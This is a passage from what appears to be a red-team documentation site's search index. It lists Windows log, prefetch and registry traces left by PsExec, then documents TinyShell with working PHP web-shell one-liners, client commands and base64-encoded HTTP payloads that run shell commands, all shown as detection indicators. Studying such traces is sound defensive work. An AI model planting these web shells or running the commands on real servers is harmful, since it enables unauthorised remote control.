SID]\\SOFTWARE\\Sysinternals\\PsExec\\EulaAccepted) Security 4689 Process Termination A process has exited. Log Date and Time: Process terminated date and time (local time)Process Information &gt; Exit Status:__ Process return value (0x0) Subject &gt; Security ID/Account Name/Account Domain: SID/Account name/Domain of the user who executed the tool Process Information &gt; Process Name: Path to the executable file (path to the tool) <p>Prefetch</p> <p>C:\\Windows\\Prefetch[Executable File Name of Tool]-[RANDOM].pf</p> <p>Registry</p> <p>Registry entry</p> <p>Key: HKEY_USERS[User SID]\\SOFTWARE\\Sysinternals\\PsExec\\EulaAccepted Value: 0x00000001</p>"},{"location":"redteaming/tool_ioc/psexec/#destination-host","title":"Destination Host","text":"Log Event ID Task Category Event Details Security 5145 Detailed File Share A network share object was checked to see whether the client can be granted the desired access. Shared Information &gt; Share Name: Share name (\\*\\ADMIN$) Subject &gt; Security ID/Account Name/Account Domain: SID/Account name/Domain of the user who executed the tool Shared Information &gt; Share Path: Share path (\\??\\C:\\Windows) Shared Information &gt; Relative Target Name: Relative target name from the share path (PSEXESVC.exe) Access Request Information &gt; Access: Requested privileges (including WriteData or AddFile, and AppendData) Microsoft-Windows-Sysmon/Operational 1 Process Create (rule: ProcessCreate) Process Create. ParentImage: Executable file of the parent process (C:\\Windows\\system32\\services.exe) CommandLine: Command line of the execution command ParentCommandLine: Command line of the parent process (C:\\Windows\\system32\\services.exe) UtcTime: Process execution date and time (UTC) ProcessGuid/ProcessId: Process IDUser: Execute as user (NT AUTHORITY\\SYSTEM) Image: Path to the executable file (C:\\Windows\\PSEXESVC.exe) System 7045 A service was installed in the system. A service was installed. Service start type: Operation of trigger that starts the service (demand start) Service account: Executing account (LocalSystem) Service type: Type of the service to be executed (user mode service) Service Name: Name displayed in the service list (PSEXESVC) Service File Name: Service executable file (%SystemRoot%\\PSEXESVC.exe) Security 5145 Detailed File Share A network share object was checked to see whether the client can be granted the desired access. Shared Information &gt; Share Name: Share name (\\*\\IPC$) Subject &gt; Security ID/Account Name/Account Domain: SID/Account name/Domain of the user who executed the tool Shared Information &gt; Relative Target Name: Relative target name from the share path (PSEXESVC-[Source Host Name]-[Source Process ID]-[stdin, stdout, stderr]) Microsoft-Windows-Sysmon/Operational 1 Process Create (rule: ProcessCreate) Process Create. ParentProcessGuid/ParentProcessId: Process ID of the parent process ParentImage: Executable file of the parent process (C:\\Windows\\PSEXESVC.exe) Image: Path to the executable file (Path to the executable file that was executed by PsExec) ParentCommandLine: Command line of the parent process (C:\\Windows\\PSEXESVC.exe)UtcTime: Process execution date and time (UTC) ProcessGuid/ProcessId: Process ID System 7036 Service Control Manager The [Service Name] service entered the [Status] state. Status: State after the transition (Stopped) Service Name: Target service name (PSEXESVC) Security 4689 Process Termination A process has exited. Log Date and Time: Process terminated date and time (local time) Process Information &gt; Exit Status: Process return value (0x0) Process Information &gt; Process Name: Path to the executable file (C:\\Windows\\PSEXESVC.exe) Security 4674 Sensitive Privilege Use An operation was attempted on a privileged object. Subject &gt; Security ID/Account Name/Account Domain: SID/Account name/Domain of the user who executed the tool Object &gt; Object Name: Name of the object to be processed (PSEXESVC) Object &gt; Object Server: Service that executed the process (SC Manager) Requested operation &gt; Privileges: Requested privilege (DELETE) Process Information &gt; Process Name: Path to the executable file (C:\\Windows\\System32\\services.exe) Object &gt; Object Type: Type of the object to be processed (SERVICE OBJECT) Microsoft-Windows-Sysmon/Operational 11 File created (rule: FileCreate) File created. Image: Path to the executable file (C:\\Windows\\System32\\svchost.exe) ProcessGuid/ProcessId: Process IDTarget Filename: Created file (C:\\Windows\\Prefetch\\PSEXECSVC.EXE-[Random Number].pf)Creation UtcTime: File creation date and time (UTC)"},{"location":"redteaming/tool_ioc/psexec/#usn-journal","title":"USN Journal","text":"File Name Process PSEXESVC.exe FILE_CREATE PSEXESVC.exe DATA_EXTEND+FILE_CREATE PSEXESVC.exe CLOSE+DATA_EXTEND+FILE_CREATE PSEXESVC.EXE-[RANDOM].pf FILE_CREATE PSEXESVC.EXE-[RANDOM].pf DATA_EXTEND+FILE_CREATE PSEXESVC.EXE-[RANDOM].pf CLOSE+DATA_EXTEND+FILE_CREATE PSEXESVC.exe CLOSE+FILE_DELETE"},{"location":"redteaming/tool_ioc/psexec/#prefetch","title":"Prefetch","text":"<p><code>C:\\Windows\\Prefetch\\PSEXESVC.EXE-[RANDOM].pf</code></p>"},{"location":"redteaming/tool_ioc/psexec/#interesting-events","title":"Interesting Events","text":""},{"location":"redteaming/tool_ioc/psexec/#references","title":"References","text":"<p>JPCERT - Research Report Released: Detecting Lateral Movement through Tracking Event Logs https://blog.jpcert.or.jp/2017/06/1-ae0d.html</p> <p>MITRE ATT&amp;CK - Technique T1035 https://attack.mitre.org/wiki/Technique/T1035</p> <p>JPCERT Tool Analysis Results https://jpcertcc.github.io/ToolAnalysisResultSheet/</p> <p>JPCERT Tool Analysis Results - PsExec https://jpcertcc.github.io/ToolAnalysisResultSheet/details/PsExec.htm</p>"},{"location":"redteaming/tool_ioc/tinyshell_ioc/","title":"TinyShell IOCs","text":"<p>TinyShell is a python command shell used to control and excute commands through HTTP requests to a webshell. TinyShell acts as the interface to the remote webshells. TinyShell is based on it's companion project SubShell (https://github.com/minisllc/subshell) and the China Chopper Webshell (https://www.fireeye.com/blog/threat-research/2013/08/breaking-down-the-china-chopper-web-shell-part-i.html)</p> <p>The following are some of the indicators generated by TinyShell.</p>"},{"location":"redteaming/tool_ioc/tinyshell_ioc/#post-mode","title":"Post Mode","text":"<p>TinyShell operating in the Base64 HTTP Post Mode using PHP. Commands are sent via a HTTP POST request.</p>"},{"location":"redteaming/tool_ioc/tinyshell_ioc/#shell","title":"Shell","text":"<pre><code>&lt;?php @eval(base64_decode($_POST['token']));?&gt;\n</code></pre> <p>Note</p> <p>The \"password\" is set to token. This can be changed to any value. It is referenced as \"--password=\" by the TinyShell client.</p>"},{"location":"redteaming/tool_ioc/tinyshell_ioc/#client-command","title":"Client Command","text":"<pre><code>python tinyshell.py --url http://10.203.63.80/upload/uploads/tinyshell.php --password=token --mode=base64_post --language=PHP\n</code></pre>"},{"location":"redteaming/tool_ioc/tinyshell_ioc/#http-request-sent-by-client","title":"HTTP Request Sent by Client","text":"<pre><code>POST /upload/uploads/tinyshell.php HTTP/1.1\nHost: 10.203.63.80\nConnection: keep-alive\nAccept-Encoding: gzip, deflate\nAccept: */*\nUser-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)\nContent-Length: 216\nContent-Type: application/x-www-form-urlencoded\n\ntoken=ZWNobygiQ1NSRl9UT0tFTjogIiAuIGJhc2U2NF9lbmNvZGUoc2hlbGxfZXhlYyhiYXNlNjRfZGVjb2RlKCdaR2x5SUdNNlhIaGhiWEJ3WEdoMFpHOWpjMXh3YjNKMFlXeGZORGhjZFhCc2IyRmtYSFZ3Ykc5aFpITT0nKSAuICIgMj4mMSIpKSAuICIgOlRPS0VOX0NTUkYiKTs%3D\n</code></pre>"},{"location":"redteaming/tool_ioc/tinyshell_ioc/#http-response","title":"HTTP Response","text":"<pre><code>HTTP/1.1 200 OK\nDate: Wed, 13 Dec 2017 20:45:25 GMT\nServer: Apache/2.4.16 (Win32) OpenSSL/1.0.1p PHP/5.5.28\nX-Powered-By: PHP/5.5.28\nContent-Length: 504\nKeep-Alive: timeout=5, max=100\nConnection: Keep-Alive\nContent-Type: text/html\n\nCSRF_TOKEN: IFZvbHVtZSBpbiBkcml2ZSBDIGhhcyBubyBsYWJlbC4KIFZvbHVtZSBTZXJpYWwgTnVtYmVyIGlzIDRFNjEtM0YzMQoKIERpcmVjdG9yeSBvZiBjOlx4YW1wcFxodGRvY3NccG9ydGFsXzQ4XHVwbG9hZFx1cGxvYWRzCgoxMi8xMy8yMDE3ICAwODo0MyBQTSAgICA8RElSPiAgICAgICAgICAuCjEyLzEzLzIwMTcgIDA4OjQzIFBNICAgIDxESVI+ICAgICAgICAgIC4uCjEyLzEzLzIwMTcgIDA4OjQzIFBNICAgICAgICAgICAgICAgIDQ2IHRpbnlzaGVsbC5waHAKICAgICAgICAgICAgICAgMSBGaWxlKHMpICAgICAgICAgICAgIDQ2IGJ5dGVzCiAgICAgICAgICAgICAgIDIgRGlyKHMpICAxOSwwMDksNDQ5LDk4NCBieXRlcyBmcmVlCg== :TOKEN_CSRF\n</code></pre> <p>Note</p> <p>This is a standalone copy of TinyShell. If this was added to an existing file, the response would contain the HTML of the source page.</p> <p>The terms \"CSRF_TOKEN:\" and \":TOKEN_CSRF\" are headers and footers that wrap the encoded response. These values are adjustable.</p>"},{"location":"redteaming/tool_ioc/tinyshell_ioc/#decoding-the-payload","title":"Decoding the Payload","text":"<p>Base64 Payload</p> <p><code>ZWNobygiQ1NSRl9UT0tFTjogIiAuIGJhc2U2NF9lbmNvZGUoc2hlbGxfZXhlYyhiYXNlNjRfZGVjb2RlKCdaR2x5SUdNNlhIaGhiWEJ3WEdoMFpHOWpjMXh3YjNKMFlXeGZORGhjZFhCc2IyRmtYSFZ3Ykc5aFpITT0nKSAuICIgMj4mMSIpKSAuICIgOlRPS0VOX0NTUkYiKTs=</code></p> <p>Decode Step 1</p> <p><code>echo(\"CSRF_TOKEN: \" . base64_encode(shell_exec(base64_decode('ZGlyIGM6XHhhbXBwXGh0ZG9jc1xwb3J0YWxfNDhcdXBsb2FkXHVwbG9hZHM=') . \" 2&gt;&amp;1\")) . \" :TOKEN_CSRF\");</code></p> <p>Decode Step 2</p> <pre><code>dir c:\\xampp\\htdocs\\portal_48\\upload\\uploads\n</code></pre> <p>Note</p> <p>This is the command set to the TinyShell web shell.</p>"},{"location":"redteaming/tool_ioc/tinyshell_ioc/#decoding-the-response","title":"Decoding the Response","text":"<p>Encoded Response</p> <p><code>IFZvbHVtZSBpbiBkcml2ZSBDIGhhcyBubyBsYWJlbC4KIFZvbHVtZSBTZXJpYWwgTnVtYmVyIGlzIDRFNjEtM0YzMQoKIERpcmVjdG9yeSBvZiBjOlx4YW1wcFxodGRvY3NccG9ydGFsXzQ4XHVwbG9hZFx1cGxvYWRzCgoxMi8xMy8yMDE3ICAwODo0MyBQTSAgICA8RElSPiAgICAgICAgICAuCjEyLzEzLzIwMTcgIDA4OjQzIFBNICAgIDxESVI+ICAgICAgICAgIC4uCjEyLzEzLzIwMTcgIDA4OjQzIFBNICAgICAgICAgICAgICAgIDQ2IHRpbnlzaGVsbC5waHAKICAgICAgICAgICAgICAgMSBGaWxlKHMpICAgICAgICAgICAgIDQ2IGJ5dGVzCiAgICAgICAgICAgICAgIDIgRGlyKHMpICAxOSwwMDksNDQ5LDk4NCBieXRlcyBmcmVlCg==</code></p> <p>Decoded Response</p> <pre><code>Volume in drive C has no label.\nVolume Serial Number is 4E61-3F31\n\nDirectory of c:\\xampp\\htdocs\\portal_48\\upload\\uploads\n\n12/13/2017  08:43 PM    &lt;DIR&gt;          .\n12/13/2017  08:43 PM    &lt;DIR&gt;          ..\n12/13/2017  08:43 PM                46 tinyshell.php\n            1 File(s)             46 bytes\n            2 Dir(s)  19,009,449,984 bytes free\n</code></pre> <p>Note</p> <p>This is the response rendered in the TinyShell console.</p>"},{"location":"redteaming/tool_ioc/tinyshell_ioc/#header-mode","title":"Header Mode","text":"<p>TinyShell operating in the Base64 HTTP Header Mode using PHP. Commands are sent via a HTTP HEADE.</p>"},{"location":"redteaming/tool_ioc/tinyshell_ioc/#shell_1","title":"Shell","text":"<pre><code>&lt;?php @eval(base64_decode($_SERVER['HTTP_PSESSION']));?&gt;\n</code></pre> <p>Note</p> <p>The \"password\" is set to \"PSESSION\". This can be changed to any value. It is referenced as \"--password=\" by the TinyShell client.</p>"},{"location":"redteaming/tool_ioc/tinyshell_ioc/#client-command_1","title":"Client Command","text":"<pre><code>python tinyshell.py --url=http://10.203.63.80/upload/uploads/tinyshell.php--language=php --password=psession --mode=base64_header\n</code></pre>"},{"location":"redteaming/tool_ioc/tinyshell_ioc/#http-request-sent-by-client_1","title":"HTTP Request Sent by Client","text":"<pre><code>POST /upload/uploads/tinyshell.php HTTP/1.1\nHost: 10.203.63.80\nConnection: keep-alive\nAccept-Encoding: gzip, deflate\nAccept: */*\nUser-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)\npsession: ZWNobygiQ1NSRl9UT0tFTjogIiAuIGJhc2U2NF9lbmNvZGUoc2hlbGxfZXhlYyhiYXNlNjRfZGVjb2RlKCdZMlE9JykgLiAiIDI+JjEiKSkgLiAiIDpUT0tFTl9DU1JGIik7\nContent-Length: 0\n</code></pre>"},{"location":"redteaming/tool_ioc/tinyshell_ioc/#http-response_1","title":"HTTP Response","text":"<pre><code>HTTP/1.1 200 OK\nDate: Thu, 14 Dec 2017 02:46:56 GMT\nServer: Apache/2.4.16 (Win32) OpenSSL/1.0.1p PHP/5.5.28\nX-Powered-By: PHP/5.5.28\nContent-Length: 80\nKeep-Alive: timeout=5, max=100\nConnection: Keep-Alive\nContent-Type: text/html\n\nCSRF_TOKEN: QzpceGFtcHBcaHRkb2NzXHBvcnRhbF80OFx1cGxvYWRcdXBsb2Fkcwo= :TOKEN_CSRFPOST /upload/uploads/tinyshell.php \n</code></pre>"},{"location":"redteaming/tool_ioc/tinyshell_ioc/#decoding-the-payload_1","title":"Decoding the Payload","text":"<p>Base64 Payload</p> <p><code>ZWNobygiQ1NSRl9UT0tFTjogIiAuIGJhc2U2NF9lbmNvZGUoc2hlbGxfZXhlYyhiYXNlNjRfZGVjb2RlKCdZMlE9JykgLiAiIDI+JjEiKSkgLiAiIDpUT0tFTl9DU1JGIik7</code></p> <p>Decode Step 1</p> <p><code>echo(\"CSRF_TOKEN: \" . base64_encode(shell_exec(base64_decode('Y2Q=') . \" 2&gt;&amp;1\")) . \" :TOKEN_CSRF\");</code></p> <p>Decode Step 2</p> <p><code>cd</code></p>"},{"location":"redteaming/tool_ioc/tinyshell_ioc/#decoding-the-response_1","title":"Decoding the Response","text":"<p>Encoded Response</p> <p><code>QzpceGFtcHBcaHRkb2NzXHBvcnRhbF80OFx1cGxvYWRcdXBsb2Fkcwo=</code></p> <p>Decoded Response</p> <p><code>C:\\xampp\\htdocs\\portal_48\\upload\\uploads</code></p> <p>Note</p> <p>This is the response rendered in the TinyShell console.</p>"},{"location":"redteaming/videos/videos/","title":"Red Team Related Videos","text":""},{"location":"redteaming/videos/videos/#oisf-planning-executing-a-red-team-engagement-2018","title":"OISF - Planning &amp; Executing A Red Team Engagement (2018)","text":"<p>Author Tim Wright</p> <p>Description Overview of Red Teaming presented at OISF.</p> <p>URL https://www.youtube.com/watch?v=QCiabLJf_UA</p> <p></p>"},{"location":"redteaming/videos/videos/#in-memory-evasion-2018","title":"In Memory Evasion (2018)","text":"<p>Author Raphael Mudge </p> <p>Description In-memory Evasion is a four-part mini course on the cat and mouse game related to memory detections. This course is for red teams that want to update their tradecraft in this area. It\u2019s also for blue teams that want to understand the red perspective on these techniques. Why do they work in some situations? How is it possible to work around these heuristics in other cases?</p> <p>Playlist - https://www.youtube.com/playlist?list=PL9HO6M_MU2nc5Q31qd2CwpZ8J4KFMhgnK</p>"},{"location":"redteaming/videos/videos/#advanced-threat-tactics-2015","title":"Advanced Threat Tactics (2015)","text":"<p>Author Raphael Mudge </p> <p>Description Advanced Threat Tactics is a course on Adversary Simulations and Red Team Operations. Learn how to get a foothold in a modern enterprise with a targeted spear phishing attack, log keystrokes and grab screenshots at scale, elevate privileges, take over an Active Directory domain, and tunnel tools and attacks through compromised systems. This course also covers core topics such as infrastructure for attacks, team operations, evasion, and how to disguise your attacks to look like other actors. </p> <p>Playlist - https://www.youtube.com/playlist?list=PL9HO6M_MU2nf8Fa5bVefBW-9bg5Rx94_c</p>"},{"location":"redteaming/videos/videos/#how-to-use-atomic-red-team-tests-2017","title":"How to Use Atomic Red Team Tests (2017)","text":"<p>Author Red Canary</p> <p>Description Atomic Red Team is an open-source testing framework mapped to the MITRE ATT&amp;CK Framework. It enables defenders to test their detections against a broad spectrum of attacks. </p> <p>URL https://www.youtube.com/watch?v=iNl_rltYmoo</p> <p></p>"},{"location":"redteaming/videos/videos/#mitres-attck-framework-2018","title":"MITRE's ATT&amp;CK Framework (2018)","text":"<p>Author MitreCorp</p> <p>Description MITRE ATT&amp;CK\u2122 is a knowledge base that helps model cyber adversaries' tactics and techniques \u2013 and then shows how to detect or stop them.</p> <p>URL https://www.youtube.com/watch?v=0BEf6s1iu5g</p> <p></p>"}]}